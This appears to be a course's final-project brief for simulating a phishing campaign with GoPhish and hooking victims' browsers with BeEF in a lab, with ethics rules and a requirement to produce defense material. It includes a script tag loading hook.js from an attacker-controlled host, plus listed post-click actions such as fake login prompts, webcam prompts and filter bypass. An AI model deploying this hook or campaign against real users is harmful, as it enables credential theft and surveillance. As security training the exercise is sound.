## Final Project: Human Weakness Exploitation via BeEF & GoPhish  
**Theme**: *Simulating Phishing and Post-Click Exploitation*

### **Objectives**

- Design a targeted phishing campaign.
- Capture clicks and interaction data via GoPhish.
- Use BeEF to hook a browser and demonstrate what an attacker could do post-click.
- Create a report + awareness material explaining the attack and how to prevent it.

---

### **Project Steps**

#### 1. Set Up Lab Environment
- Kali Linux with:
  - BeEF installed (`/usr/share/beef-xss`)
  - GoPhish (download from [https://github.com/gophish/gophish](https://github.com/gophish/gophish))
- Optional: Metasploitable VM or any sandboxed target for realism
- Ensure all testing is done in a **contained environment with full consent**.

---

#### 2. GoPhish Campaign Setup
- Create a **phishing email** with:
  - A believable message (e.g., "Important Update Required")
  - A link to a fake login page or document portal

- Landing page should include the **BeEF hook**:
  ```html
  <script src="http://<your-kali-ip>:3000/hook.js"></script>
  ```

- Start GoPhish, configure your SMTP settings, and launch the campaign.


#### 3. BeEF Exploitation Phase
- Once the user lands on the page, BeEF will show a **hooked browser**.
- Demonstrate basic post-exploitation:
  - Alert box
  - Browser fingerprinting
  - Fake login prompt
  - Webcam prompt (but **do not use** it unless it's your own machine)

#### 4. Metrics to Collect
- Emails sent / opened
- Links clicked
- Hooked sessions in BeEF
- Commands successfully run in BeEF
- Time-to-click stats

#### 5. Awareness & Defense Material
Each student/team must create:
- A poster, flyer, or video showing:
  - How this attack works
  - Red flags to watch for
  - Technical and non-technical defenses (e.g., email filtering, user training, browser hardening)


#### 6. Final Report
- Executive Summary
- Attack Simulation Details
- Ethical Boundaries Maintained
- GoPhish Campaign Overview
- BeEF Post-Click Actions
- Defense Recommendations

### Ethics & Rules
- No phishing real users without explicit consent
- No persistence, malware, or real data exfiltration
- All email recipients must be part of the exercise and aware of the simulation either before or immediately after
- Hooked browsers must be student-owned or lab machines


- Integrate a **custom payload** in BeEF
- Bypass a basic email filter or browser security warning (safely)
- Create a **mock SOC alert** based on the campaign
